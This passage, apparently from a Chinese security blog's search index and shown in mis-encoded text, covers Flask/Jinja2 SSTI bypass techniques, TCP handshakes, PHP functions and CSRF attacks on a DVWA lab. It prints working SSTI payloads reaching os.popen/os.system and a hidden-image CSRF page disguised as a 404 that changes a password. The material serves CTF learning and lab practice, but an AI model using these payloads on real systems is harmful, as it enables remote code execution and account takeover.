ä¹‹é—´çš„åˆ†éš”ç¬¦é»˜è®¤æƒ…å†µä¸‹æ˜¯ä¸€ä¸ªç©ºå­—ç¬¦ä¸²ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨å¯é€‰å‚æ•°å¯¹å…¶è¿›è¡Œå®šä¹‰: {{ [1, 2, 3]|join('|') }} -&gt; 1|2|3{{ [1, 2, 3]|join }} -&gt; 123â€‹```å¹¶ä¸”å¯ä»¥è¿æ¥å¯¹è±¡çš„æŸäº›å±æ€§: {{ users|join(', ', attribute='username') }}â€‹```**last(seq)**:è¿”å›åºåˆ—æœ€åçš„ä¸€ä¸ªå…ƒç´ :**length(object)ï¼š**è¿”å›åºåˆ—ä¸­çš„é¡¹ç›®æ•°**list(value):**å°†å€¼è½¬æ¢ä¸ºåˆ—è¡¨ã€‚å¦‚æœæ˜¯å­—ç¬¦ä¸²ï¼Œåˆ™è¿”å›çš„åˆ—è¡¨å°†æ˜¯å­—ç¬¦åˆ—è¡¨ã€‚**random(seq):**ä»åºåˆ—ä¸­è¿”å›ä¸€ä¸ªéšæœºé¡¹ç›®**select():**å¯ä»¥ç”¨æ¥é€‰æ‹©å¯¹è±¡: {{ numbers|select(&quot;odd&quot;) }}â€‹```**selectattr():**è¿™ä¸ªå¯ä»¥ç”¨æ¥é€‰æ‹©éœ€è¦çš„object int()ï¼šå°†å€¼è½¬æ¢ä¸ºintç±»å‹ï¼›float()ï¼šå°†å€¼è½¬æ¢ä¸ºfloatç±»å‹ï¼›lower()ï¼šå°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå°å†™ï¼›upper()ï¼šå°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå¤§å†™ï¼›title()ï¼šæŠŠå€¼ä¸­çš„æ¯ä¸ªå•è¯çš„é¦–å­—æ¯éƒ½è½¬æˆå¤§å†™ï¼›capitalize()ï¼šæŠŠå˜é‡å€¼çš„é¦–å­—æ¯è½¬æˆå¤§å†™ï¼Œå…¶ä½™å­—æ¯è½¬å°å†™ï¼›trim()ï¼šæˆªå–å­—ç¬¦ä¸²å‰é¢å’Œåé¢çš„ç©ºç™½å­—ç¬¦ï¼›wordcount()ï¼šè®¡ç®—ä¸€ä¸ªé•¿å­—ç¬¦ä¸²ä¸­å•è¯çš„ä¸ªæ•°ï¼›reverse()ï¼šå­—ç¬¦ä¸²åè½¬ï¼›replace(value,old,new)ï¼š æ›¿æ¢å°†oldæ›¿æ¢ä¸ºnewçš„å­—ç¬¦ä¸²ï¼›truncate(value,length=255,killwords=False)ï¼šæˆªå–lengthé•¿åº¦çš„å­—ç¬¦ä¸²ï¼›striptags()ï¼šåˆ é™¤å­—ç¬¦ä¸²ä¸­æ‰€æœ‰çš„HTMLæ ‡ç­¾ï¼Œå¦‚æœå‡ºç°å¤šä¸ªç©ºæ ¼ï¼Œå°†æ›¿æ¢æˆä¸€ä¸ªç©ºæ ¼ï¼›escape()æˆ–eï¼šè½¬ä¹‰å­—ç¬¦ï¼Œä¼šå°†&lt;ã€&gt;ç­‰ç¬¦å·è½¬ä¹‰æˆHTMLä¸­çš„ç¬¦å·ã€‚æ˜¾ä¾‹ï¼šcontent|escapeæˆ–content|eã€‚safe()ï¼š ç¦ç”¨HTMLè½¬ä¹‰ï¼Œå¦‚æœå¼€å¯äº†å…¨å±€è½¬ä¹‰ï¼Œé‚£ä¹ˆsafeè¿‡æ»¤å™¨ä¼šå°†å˜é‡å…³æ‰è½¬ä¹‰ã€‚ç¤ºä¾‹ï¼š {{'&lt;em&gt;hello&lt;/em&gt;'|safe}}ï¼›list()ï¼šå°†å˜é‡åˆ—æˆåˆ—è¡¨ï¼›string()ï¼šå°†å˜é‡è½¬æ¢æˆå­—ç¬¦ä¸²ï¼›join()ï¼šå°†ä¸€ä¸ªåºåˆ—ä¸­çš„å‚æ•°å€¼æ‹¼æ¥æˆå­—ç¬¦ä¸²ã€‚ç¤ºä¾‹çœ‹ä¸Šé¢payloadï¼›abs()ï¼šè¿”å›ä¸€ä¸ªæ•°å€¼çš„ç»å¯¹å€¼ï¼›first()ï¼šè¿”å›ä¸€ä¸ªåºåˆ—çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼›last()ï¼šè¿”å›ä¸€ä¸ªåºåˆ—çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼›format(value,arags,*kwargs)ï¼šæ ¼å¼åŒ–å­—ç¬¦ä¸²ã€‚æ¯”å¦‚ï¼š{{ &quot;%s&quot; - &quot;%s&quot;|format('Hello?',&quot;Foo!&quot;) }}å°†è¾“å‡ºï¼šHelloo? - Foo!length()ï¼šè¿”å›ä¸€ä¸ªåºåˆ—æˆ–è€…å­—å…¸çš„é•¿åº¦ï¼›sum()ï¼šè¿”å›åˆ—è¡¨å†…æ•°å€¼çš„å’Œï¼›sort()ï¼šè¿”å›æ’åºåçš„åˆ—è¡¨ï¼›pop(): å‡½æ•°ç”¨äºç§»é™¤åˆ—è¡¨ä¸­çš„ä¸€ä¸ªå…ƒç´ ï¼ˆé»˜è®¤æœ€åä¸€ä¸ªå…ƒç´ ï¼‰ï¼Œå¹¶ä¸”è¿”å›è¯¥å…ƒç´ çš„å€¼ï¼Œåœ¨è¿™é‡Œä½¿ç”¨popå¹¶ä¸ä¼šçœŸçš„ç§»é™¤,ä½†å´èƒ½è¿”å›å…¶å€¼,å–ä»£ä¸­æ‹¬å·,æ¥å®ç°ç»•è¿‡default(value,default_value,boolean=false)ï¼šå¦‚æœå½“å‰å˜é‡æ²¡æœ‰å€¼ï¼Œåˆ™ä¼šä½¿ç”¨å‚æ•°ä¸­çš„å€¼æ¥ä»£æ›¿ã€‚ç¤ºä¾‹ï¼šname|default('xiaotuo')----å¦‚æœnameä¸å­˜åœ¨ï¼Œåˆ™ä¼šä½¿ç”¨xiaotuoæ¥æ›¿ä»£ã€‚boolean=Falseé»˜è®¤æ˜¯åœ¨åªæœ‰è¿™ä¸ªå˜é‡ä¸ºundefinedçš„æ—¶å€™æ‰ä¼šä½¿ç”¨defaultä¸­çš„å€¼ï¼Œå¦‚æœæƒ³ä½¿ç”¨pythonçš„å½¢å¼åˆ¤æ–­æ˜¯å¦ä¸ºfalseï¼Œåˆ™å¯ä»¥ä¼ é€’boolean=trueã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨oræ¥æ›¿æ¢ã€‚length()è¿”å›å­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œåˆ«åæ˜¯countâ€‹``` __class__ ç±»çš„ä¸€ä¸ªå†…ç½®å±æ€§ï¼Œè¡¨ç¤ºå®ä¾‹å¯¹è±¡çš„ç±»ã€‚__base__ ç±»å‹å¯¹è±¡çš„ç›´æ¥åŸºç±»__bases__ ç±»å‹å¯¹è±¡çš„å…¨éƒ¨åŸºç±»ï¼Œä»¥å…ƒç»„å½¢å¼ï¼Œç±»å‹çš„å®ä¾‹é€šå¸¸æ²¡æœ‰å±æ€§ __bases____mro__ æ­¤å±æ€§æ˜¯ç”±ç±»ç»„æˆçš„å…ƒç»„ï¼Œåœ¨æ–¹æ³•è§£ææœŸé—´ä¼šåŸºäºå®ƒæ¥æŸ¥æ‰¾åŸºç±»ã€‚__subclasses__() è¿”å›è¿™ä¸ªç±»çš„å­ç±»é›†åˆï¼ŒEach class keeps a list of weak references to its immediate subclasses. This method returns a list of all those references still alive. The list is in definition order.__init__ åˆå§‹åŒ–ç±»ï¼Œè¿”å›çš„ç±»å‹æ˜¯function__globals__ ä½¿ç”¨æ–¹å¼æ˜¯ å‡½æ•°å.__globals__è·å–functionæ‰€å¤„ç©ºé—´ä¸‹å¯ä½¿ç”¨çš„moduleã€æ–¹æ³•ä»¥åŠæ‰€æœ‰å˜é‡ã€‚__dic__ ç±»çš„é™æ€å‡½æ•°ã€ç±»å‡½æ•°ã€æ™®é€šå‡½æ•°ã€å…¨å±€å˜é‡ä»¥åŠä¸€äº›å†…ç½®çš„å±æ€§éƒ½æ˜¯æ”¾åœ¨ç±»çš„__dict__é‡Œ__getattribute__() å®ä¾‹ã€ç±»ã€å‡½æ•°éƒ½å…·æœ‰çš„__getattribute__é­”æœ¯æ–¹æ³•ã€‚äº‹å®ä¸Šï¼Œåœ¨å®ä¾‹åŒ–çš„å¯¹è±¡è¿›è¡Œ.æ“ä½œçš„æ—¶å€™ï¼ˆå½¢å¦‚ï¼ša.xxx/a.xxx()ï¼‰ï¼Œéƒ½ä¼šè‡ªåŠ¨å»è°ƒç”¨__getattribute__æ–¹æ³•ã€‚å› æ­¤æˆ‘ä»¬åŒæ ·å¯ä»¥ç›´æ¥é€šè¿‡è¿™ä¸ªæ–¹æ³•æ¥è·å–åˆ°å®ä¾‹ã€ç±»ã€å‡½æ•°çš„å±æ€§ã€‚__getitem__() è°ƒç”¨å­—å…¸ä¸­çš„é”®å€¼ï¼Œå…¶å®å°±æ˜¯è°ƒç”¨è¿™ä¸ªé­”æœ¯æ–¹æ³•ï¼Œæ¯”å¦‚a['b']ï¼Œå°±æ˜¯a.__getitem__('b')__builtins__ å†…å»ºåç§°ç©ºé—´ï¼Œå†…å»ºåç§°ç©ºé—´æœ‰è®¸å¤šåå­—åˆ°å¯¹è±¡ä¹‹é—´æ˜ å°„ï¼Œè€Œè¿™äº›åå­—å…¶å®å°±æ˜¯å†…å»ºå‡½æ•°çš„åç§°ï¼Œå¯¹è±¡å°±æ˜¯è¿™äº›å†…å»ºå‡½æ•°æœ¬èº«ã€‚å³é‡Œé¢æœ‰å¾ˆå¤šå¸¸ç”¨çš„å‡½æ•°ã€‚__builtins__ä¸__builtin__çš„åŒºåˆ«å°±ä¸æ”¾äº†ï¼Œç™¾åº¦éƒ½æœ‰ã€‚__import__ åŠ¨æ€åŠ è½½ç±»å’Œå‡½æ•°ï¼Œä¹Ÿå°±æ˜¯å¯¼å…¥æ¨¡å—ï¼Œç»å¸¸ç”¨äºå¯¼å…¥osæ¨¡å—ï¼Œ__import__('os').popen('ls').read()]__str__() è¿”å›æå†™è¿™ä¸ªå¯¹è±¡çš„å­—ç¬¦ä¸²ï¼Œå¯ä»¥ç†è§£æˆå°±æ˜¯æ‰“å°å‡ºæ¥ã€‚url_for flaskçš„ä¸€ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨äºå¾—åˆ°__builtins__ï¼Œè€Œä¸”url_for.__globals__['__builtins__']å«æœ‰current_appã€‚get_flashed_messages flaskçš„ä¸€ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨äºå¾—åˆ°__builtins__ï¼Œè€Œä¸”url_for.__globals__['__builtins__']å«æœ‰current_appã€‚lipsum flaskçš„ä¸€ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨äºå¾—åˆ°__builtins__ï¼Œè€Œä¸”lipsum.__globals__å«æœ‰osæ¨¡å—ï¼š{{lipsum.__globals__['os'].popen('ls').read()}}current_app åº”ç”¨ä¸Šä¸‹æ–‡ï¼Œä¸€ä¸ªå…¨å±€å˜é‡ã€‚__doc__:ä½¿ç”¨docstringsï¼Œæ¯ä¸ªå¯¹è±¡éƒ½æœ‰è‡ªå·±çš„.__doc__å±æ€§ï¼Œè°ƒç”¨__doc__å³ä¸ºè°ƒç”¨å…¶æ–‡æ¡£å­—ç¬¦ä¸²request å¯ä»¥ç”¨äºè·å–å­—ç¬¦ä¸²æ¥ç»•è¿‡ï¼ŒåŒ…æ‹¬ä¸‹é¢è¿™äº›ï¼Œå¼•ç”¨ä¸€ä¸‹ç¾½å¸ˆå‚…çš„ã€‚æ­¤å¤–ï¼ŒåŒæ ·å¯ä»¥è·å–openå‡½æ•°:request.__init__.__globals__['__builtins__'].open('/proc\\self\\fd/3').read()request.args.x1 getä¼ å‚request.values.x1 æ‰€æœ‰å‚æ•°request.cookies cookieså‚æ•°request.headers è¯·æ±‚å¤´å‚æ•°request.form.x1 postä¼ å‚ (Content-Type:applicaation/x-www-form-urlencodedæˆ–multipart/form-data)request.data postä¼ å‚ (Content-Type:a/b)request.json postä¼ json (Content-Type: application/json)config å½“å‰applicationçš„æ‰€æœ‰é…ç½®ã€‚æ­¤å¤–ï¼Œä¹Ÿå¯ä»¥è¿™æ ·{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}g {{g}}å¾—åˆ°&lt;flask.g of 'flask_ssti'&gt; å‚è€ƒ:https://blog.csdn.net/xiaolong22333/article/details/114228433http://ctf.ieki.xyz/library/ssti.htmlhttps://jinja.palletsprojects.com/en/2.11.x/templates/#list-of-builtin-filters fuzzè„šæœ¬ç»“æœï¼ˆå‰è¾ˆæ•´ç†ï¼‰[].__class__.__base__.__subclasses__()[40].__init__.__globals__['os'].system('ls')[].__class__.__base__.__subclasses__()[76].__init__.__globals__['os'].system('ls')&quot;&quot;.__class__.__mro__[-1].__subclasses__()[60].__init__.__globals__['__builtins__']['eval']('_ _import__(&quot;os&quot;).system(&quot;ls&quot;)')&quot;&quot;.__class__.__mro__[-1].__subclasses__()[61].__init__.__globals__['__builtins__']['eval']('_ _import__(&quot;os&quot;).system(&quot;ls&quot;)')&quot;&quot;.__class__.__mro__[-1].__subclasses__()[40](filename).read()&quot;&quot;.__class__.__mro__[-1].__subclasses__()[29].__call__(eval,'os.system(&quot;ls&quot;)')''.__class__.__mro__[2].__subclasses__()[59].__init__.__getattribute__('func_globals')['linecache'].__dict__['sys'].modules['os'].popen('ls').read()â€‹```","link":"/2021/04/08/SSTI%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3/"},{"title":"TCPä¸‰æ¬¡æ¡æ‰‹","text":"TCPä¸‰æ¬¡æ¡æ‰‹https://blog.csdn.net/qzcsu/article/details/72861891è¿™é‡Œæœ‰æ­£ç»è§£é‡Š é€šä¿—æ¥è¯´æ˜¯:â€è®©æˆ‘çŸ¥é“ä½ å·²ç»çŸ¥é“äº†â€è§£é‡Š:å®¢æˆ·ç«¯å…ˆå‘é€è¯·æ±‚æŠ¥æ–‡ç»™æœåŠ¡ç«¯ï¼ŒæœåŠ¡ç«¯æ”¶åˆ°æŠ¥æ–‡åï¼Œä¹Ÿå‘é€ä¸€ä¸ªè‡ªå·±çš„ç¡®è®¤æŠ¥æ–‡ï¼ˆå…¶ä¸­ä¼šåŒ…å«è¯·æ±‚æŠ¥æ–‡ä¸­çš„å†…å®¹ï¼‰ç»™å®¢æˆ·ç«¯ï¼Œå®¢æˆ·ç«¯æ”¶åˆ°ç¡®è®¤æŠ¥æ–‡åï¼Œå†å‘é€ç¡®è®¤æ”¶åˆ°æŠ¥æ–‡ç»™æœåŠ¡ç«¯(ä¹ŸåŒ…å«æœåŠ¡ç«¯ç¡®è®¤æŠ¥æ–‡çš„ä¿¡æ¯)ï¼Œæ¥ä¸‹æ¥ä¸¤è€…æ­£å¼å»ºç«‹è¿æ¥ TCPå››æ¬¡æŒ¥æ‰‹è§£é‡Šï¼šå®¢æˆ·ç«¯å‘é€ç»ˆæ­¢æŠ¥æ–‡ç»™æœåŠ¡ç«¯ï¼ŒæœåŠ¡ç«¯æ”¶åˆ°æŠ¥æ–‡åå…ˆå›å¤ä¸€æ¬¡ï¼Œè¯´å®ƒå·²ç»æ”¶åˆ°äº†ï¼Œå¦‚æœæ‰‹å¤´ä¸Šæ²¡å·¥ä½œï¼Œé‚£ä¹ˆå†å›å¤ä¸€æ¬¡ï¼Œå¦‚æœæ‰‹å¤´ä¸Šæœ‰å·¥ä½œï¼Œå°±ç­‰æ‰‹å¤´ä¸Šçš„å·¥ä½œåšå®Œäº†ï¼Œå†å›å¤ï¼Œå®¢æˆ·ç«¯æ”¶åˆ°ç¬¬ä¸€æ¬¡å›å¤æ—¶ï¼Œå…ˆä¸åšååº”ï¼Œç­‰æ”¶åˆ°ç¬¬äºŒæ¬¡å›å¤(finä¿¡å·)å›å¤çš„æ—¶å€™ï¼Œå†å›å¤ä¸€ä¸ªç¡®è®¤ä¿¡å·ï¼ŒæœåŠ¡ç«¯æ”¶åˆ°è¿™ä¸ªæœ€ç»ˆé‡Šæ”¾ç¡®è®¤ä¿¡å·çš„æ—¶å€™ï¼Œå°±åœæ­¢å·¥ä½œäº†ï¼Œè€Œå®¢æˆ·ç«¯è¿˜è¦2*MSLï¼ˆæœ€é•¿æŠ¥æ–‡æ®µå¯¿å‘½ï¼‰çš„æ—¶é—´åï¼Œå½“å®¢æˆ·ç«¯æ’¤é”€ç›¸åº”çš„TCBåï¼Œæ‰è¿›å…¥CLOSEDçŠ¶æ€ã€‚ ä¸ºä»€ä¹ˆè¦ç»è¿‡æœ€é•¿æŠ¥æ–‡æ®µå¯¿å‘½å†ç»ˆæ­¢å‘¢?:å¦‚æœå®¢æˆ·ç«¯æœ€åçš„ç¡®è®¤é‡Šæ”¾ä¿¡å·æ²¡æœ‰ä¸¢å¤±ï¼Œé‚£ä¹ˆæœåŠ¡ç«¯å°†ä¸ä¼šå†å›å¤ï¼Œå¦‚æœå®¢æˆ·ç«¯æœ€åçš„ç¡®è®¤é‡Šæ”¾ä¿¡å·ä¸¢å¤±ï¼Œé‚£ä¹ˆæœåŠ¡ç«¯å°†ä¼šé‡æ–°å›å¤è®©å®¢æˆ·ç«¯å†å‘é€ä¸€æ¬¡ç¡®è®¤é‡Šæ”¾ä¿¡å·ï¼Œè¿™ä¸ªæ—¶é—´å°±æ˜¯ç”¨æ¥ç¡®è®¤é‡Šæ”¾ä¿¡å·æ˜¯å¦ä¸¢å¤±çš„ã€‚","link":"/2021/01/28/TCP%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B/"},{"title":"PHPå‡½æ•°","text":"PHPå‡½æ•°phpå‡½æ•°çš„å‡†åˆ™1.å‡½æ•°çš„åç§°åº”è¯¥æç¤ºå‡ºå®ƒçš„åŠŸèƒ½2.å‡½æ•°åç§°ä»¥å­—æ¯æˆ–ä¸‹åˆ’çº¿å¼€å¤´è¿™è¾¹å…ˆä»‹ç»ä¸€ä¸ªfunctionè‡ªå®šä¹‰å‡½æ•°æ ¼å¼æ˜¯ 1234function a()//aä½ æƒ³å®šä¹‰çš„å‡½æ•°çš„åç§°{ è¯¥ç¨‹åºæ‰€è¦æ‰§è¡Œçš„æŒ‡ä»¤ï¼›} ä¸¾ä¸ªä¾‹å­ ä¸¾ä¸ªä¾‹å­ 123456789&lt;?phpfunction writeName(){ echo &quot;Kai Jim Refsnes&quot;;}echo &quot;My name is &quot;;writeName();?&gt; è¿™ä¸ªfunctionå‡½æ•°è¿˜å¯ä»¥ç»™å‡½æ•°è®¾ç½®ä¸€ä¸ªå˜é‡æ ¼å¼æ˜¯ 123456function a($b)//bæ˜¯ä½ æƒ³è¦æ”¹å˜çš„é‚£ä¸ªå˜é‡å{ ä½ è¦æ‰§è¡Œçš„æŒ‡ä»¤$b;}a(ä½ æƒ³è¦æ”¹å˜çš„å€¼); ä¸¾ä¸ªä¾‹å­ 1234567&lt;?phpfunction a($b){ echo&quot;æˆ‘å¿ƒé‡Œçš„æ•°å­—æ˜¯&quot;.$b;//echoå’Œ$bä¸­é—´çš„è¿æ¥æ˜¯ä¸ª.}echo a(3);?&gt; 12è¾“å‡ºç»“æœï¼šæˆ‘å¿ƒé‡Œçš„æ•°å­—æ˜¯3 PHPè¿”å›å€¼çš„é—®é¢˜é¦–å…ˆè¦ç†è§£ä»€ä¹ˆæ˜¯è¿”å›å€¼ï¼Œä»€ä¹ˆæ—¶å€™éœ€è¦ç”¨è¿”å›å€¼è¿”å›å€¼ï¼Œå°±æ˜¯ä½ è¿ç”¨ä¸€ä¸ªå‡½æ•°ï¼Œå‡½æ•°ç»“æŸåï¼Œæœ‰ä¸€ä¸ªç»“æœï¼Œå¦‚æœä½ éœ€è¦é‚£ä¸ªç»“æœï¼Œä½ å°±éœ€è¦è¿”å›å€¼ä¸¾ä¸ªä¾‹å­ æ¯”å¦‚3+5=ï¼Ÿï¼Œåœ¨ç¨‹åºå½“ä¸­æˆ‘ä»¬éœ€è¦è¿™ä¸ªç­”æ¡ˆçš„ç»“æœï¼Œå°±éœ€è¦è¿”å›å€¼ ä¸¾ä¸ªä¾‹å­ 123456789&lt;?phpfunction add($x,$y){ $total=$x+$y; return $total;}echo &quot;1 + 16 = &quot; . add(1,16);?&gt; ç„¶åå…¶ä»–å‡½æ•°ï¼Œé‡åˆ°äº†å†æ¥è¡¥å……","link":"/2020/10/14/PHP%E5%87%BD%E6%95%B0/"},{"title":"CSRF","text":"æ„Ÿè§‰è¦å†™çš„ä¸œè¥¿è›®å¤šçš„ï¼Œæ‰€ä»¥å•ç‹¬æ‹‰å‡ºæ¥è®²ä¸€ä¸‹ CSRFCSRFï¼Œå…¨ç¨‹cross-site request forgery ç¿»è¯‘è¿‡æ¥å°±æ˜¯è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼Œæ˜¯æŒ‡åˆ©ç”¨å—å®³è€…å°šæœªæ˜¯å°çš„èº«ä»½è®¤è¯ä¿¡æ¯ï¼ˆcookieã€ä¼šè¯ç­‰ï¼‰ï¼Œè¯±éª—å…¶ç‚¹å‡»æ¶æ„é“¾æ¥æˆ–è€…è®¿é—®åŒ…å«æ”»å‡»ä»£ç çš„é¡µé¢ï¼Œåœ¨å—å®³äººä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹ä»¥å—å®³è€…çš„èº«ä»½å‘ï¼ˆèº«ä»½è®¤è¯ä¿¡æ¯æ‰€å¯¹åº”çš„ï¼‰æœåŠ¡å™¨å‘é€è¯·æ±‚ï¼Œä»è€Œå®Œæˆéæ³•æ“ä½œï¼ˆå¦‚è½¬è´¦ï¼Œæ”¹å¯†ç­‰ï¼‰ã€‚CSRFä¸XSSæœ€å¤§çš„åŒºåˆ«å°±åœ¨äºï¼ŒCSRFå¹¶æ²¡æœ‰ç›—å–cookieè€Œæ˜¯ç›´æ¥åˆ©ç”¨ã€‚ç†è§£ï¼šæ”»å‡»è€…ç›—ç”¨äº†ä½ çš„èº«ä»½ï¼Œä»¥ä½ çš„åä¹‰è¿›è¡ŒæŸäº›éæ³•æ“ä½œã€‚CSRFèƒ½å¤Ÿä½¿ç”¨ä½ çš„è´¦æˆ·å‘é€é‚®ä»¶ï¼Œè·å–ä½ çš„æ•æ„Ÿä¿¡æ¯ï¼Œç”šè‡³ç›—èµ°ä½ çš„è´¢äº§ CSRFæ”»å‡»åŸç† å›¾ç‰‡æ¥è‡ªï¼šhttps://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html æ¼æ´æ£€æµ‹é€šè¿‡htmlæ ‡ç­¾å‘é€åˆæ³•è·¨åŸŸè¯·æ±‚æŠ“å–æ­£å¸¸è¯·æ±‚çš„æ•°æ®åŒ…ï¼Œå¦‚æœä¸å­˜åœ¨tokenéªŒè¯ï¼Œå»æ‰è¯·æ±‚å¤´ä¸­Refererå­—æ®µå†é‡æ–°æäº¤ï¼Œå¦‚æœæœåŠ¡å™¨è¿”å›æ­£å¸¸é¡µé¢ï¼ŒåŸºæœ¬å¯ä»¥ç¡®å®šå­˜åœ¨CSRFæ¼æ´æ¼æ´åˆ©ç”¨é€šè¿‡htmlæ ‡ç­¾å‘é€åˆæ³•è·¨è¶Šè¯·æ±‚imgè¡¨æƒ…ä¸å—åŒæºç­–ç•¥çš„é™åˆ¶ï¼Œä½¿ç”¨imgæ ‡ç­¾çš„srcå±æ€§äº§ç”Ÿçš„è·¨åŸŸè¯·æ±‚è¢«æµè§ˆå™¨è®¤ä¸ºæ˜¯åˆæ³•è¯·æ±‚ï¼Œè¯±å¯¼ç”¨æˆ·ç‚¹å‡»é“¾æ¥äº§ç”Ÿæ”»å‡» 1&lt;img src=&quot;URL&quot; /&gt; ä¸ºä»€ä¹ˆè¯´CSRFæ²¡æœ‰è·å–cookieï¼Œå´èƒ½åˆ©ç”¨cookieæ”»å‡»ï¼Ÿæ”»å‡»è€…çš„ç½‘ç«™è™½ç„¶æ˜¯è·¨åŸŸçš„ï¼Œä½†æ˜¯ä»–æ„é€ çš„é“¾æ¥æ˜¯æºç½‘ç«™çš„ï¼Œå› ä¸ºæºç½‘ç«™å­˜åœ¨CSRFï¼Œæ„é€ çš„é“¾æ¥è·Ÿæºç½‘ç«™åŒæºï¼Œæ‰€ä»¥æµè§ˆå™¨è‡ªåŠ¨æºå¸¦cookieå‘èµ·è®¿é—® å®ç°æ”»å‡»1.ç¼©å†™URLï¼Œå¦‚æœæˆ‘ä»¬ç›´æ¥è€ä¸Šhttp://127.0.0.1:81/DVWA-master/vulnerabilities/csrf/?password_new=hacker1&amp;password_conf=hacker1&amp;Change=Change#è¿™æ®µï¼Œå‚»å­éƒ½çœ‹å¾—å‡ºæ¥æ˜¯ä¸ªé™·é˜±ï¼Œæ‰€ä»¥è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ç½‘ç»œä¸Šç°æœ‰çš„URLç¼©å†™å·¥å…·ï¼Œè¿›è¡Œç¼©å†™ï¼Œä»¥è¾¾åˆ°æ¬ºéª—çš„ç›®çš„2.æ„å»º404ç½‘é¡µè¿›è¡Œæ¬ºéª—è¿™é‡Œæˆ‘ä»¬å¯ä»¥å†™ä¸€æ®µhtmlä»£ç ï¼Œå°†æˆ‘ä»¬çš„URLè—åŒ¿äºå…¶ä¸­ã€‚ lowï¼šé¦–å…ˆéœ€è¦å°†ç½‘é¡µæ”¾ç½®åœ¨ç„¶åæ„å»ºä¸€ä¸ªç½‘ç«™ï¼Œ 123456789101112&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;title&gt;CSRF&lt;/title&gt;&lt;/head&gt; &lt;img src=&quot;http://127.0.0.1:81/DVWA-master/vulnerabilities/csrf/?password_new=hacker1&amp;password_conf=hacker1&amp;Change=Change#&quot;border=&quot;0&quot; style=&quot;display:none;&quot;&gt;&lt;h1&gt; 404&lt;h1&gt; &lt;h2&gt; file not found.&lt;h2&gt; &lt;body&gt; &lt;/body&gt; &lt;/html&gt; 1æœ‰&lt;title&gt;è®°å¾—è¦æœ‰&lt;/title&gt; è¿™æ · å½“æˆ‘ä»¬ç™»å½•äº†è¿™ä¸ªç½‘ç«™åï¼ŒDVWAé‚£è¾¹çš„è´¦å·å¯†ç å°±å‘ç”Ÿäº†æ”¹å˜ã€‚è¿˜æ˜¯å¾ˆç¥å¥‡çš„ã€‚ mediumï¼š1if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false ) stripos()å‡½æ•°ï¼šrefereræ˜¯å¦åŒ…å«server_nameä¸­çš„å‚æ•°server_nameï¼šhttpåŒ…å¤´çš„Hostå‚æ•°ï¼ŒåŠè¦è®¿é—®çš„ä¸»æœºåæ¼æ´åˆ©ç”¨ï¼šå› ä¸ºä»–æ¯”å¯¹çš„æ˜¯refereræˆ‘ä»¬å…ˆçœ‹çœ‹æ­£å¸¸ä¿®æ”¹çš„æŠ“åŒ…é¡µé¢ï¼š åœ¨HOSTå’Œrefereréƒ½å«æœ‰127.0.0.1:81æ˜¯ï¼Œé€šè¿‡éªŒè¯ï¼Œæ‰€ä»¥ä¿®æ”¹å¯†ç æˆåŠŸï¼Œé‚£ä¹ˆå†æˆ‘ä»¬çš„CSRFé¡µé¢ä¸­ï¼Œ è¿™é‡Œçš„Refererå’ŒåŸé¡µé¢çš„ä¸ä¸€æ ·ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¯¥å¦‚ä½•ä¿®æ”¹å‘¢ï¼Ÿï¼Œ **æ–¹æ³•ä¸€**å°±æ˜¯ç›´æ¥åœ¨æ–‡ä»¶åä¸ŠåŠ¨æ‰‹å°†æ–‡ä»¶å‘½åä¸ºä½•HOSTä¸€æ · **ä½†æ˜¯**åœ¨è¿™é‡Œä¸å¯è¡Œï¼Œå› ä¸ºæ–‡ä»¶åä¸èƒ½æœ‰å†’å·ï¼Œæ‰€ä»¥åœ¨è¿™é‡Œæ˜¯è¡Œä¸é€šçš„ **æ–¹æ³•äºŒ**ç›´æ¥burpsuitæŠ“åŒ…ï¼Œæ›´æ”¹Referer ç›´æ¥åœ¨è¿™é‡Œæ·»åŠ å³å¯ï¼Œä¹Ÿå¯ä»¥ç»•è¿‡ highï¼š1checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); è¿™é‡Œæ¯”å¯¹çš„æ˜¯tokenï¼Œæ¯æ¬¡éƒ½ä¼šç”Ÿæˆä¸€ä¸ªä¸åŒçš„tokenï¼Œå‡ ç§å¸¸è§çš„CSRFæ–¹å¼ï¼š 1234&lt;img&gt;æ ‡ç­¾å±æ€§&lt;iframe&gt;æ ‡ç­¾å±æ€§&lt;script&gt;æ ‡ç­¾å±æ€§JavaScriptæ–¹æ³•ï¼šImageå¯¹è±¡ã€XMLHTTPå¯¹è±¡ HTMLå†…è”æ¡†æ¶å…ƒç´  (&lt;iframe&gt;) è¡¨ç¤ºåµŒå¥—çš„browsing contextã€‚å®ƒèƒ½å¤Ÿå°†å¦ä¸€ä¸ªHTMLé¡µé¢åµŒå…¥åˆ°å½“å‰é¡µé¢ä¸­ã€‚è¯¦ç»†è§£é‡Šhttps://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/iframe#example2ï¼Œæ„Ÿè§‰è¿™ä¸ªå’Œimgæ˜¯ä¸€ä¸ªæ„æ€ï¼Œåœ¨ç½‘é¡µä¸­ä¼šç›´æ¥è¢«&quot;å¼•ç”¨æˆ–è€…è¯´æ‰“å¼€ï¼Ÿ&quot;çš„æ„Ÿè§‰**HTML &lt;/script/&gt; **å…ƒç´ 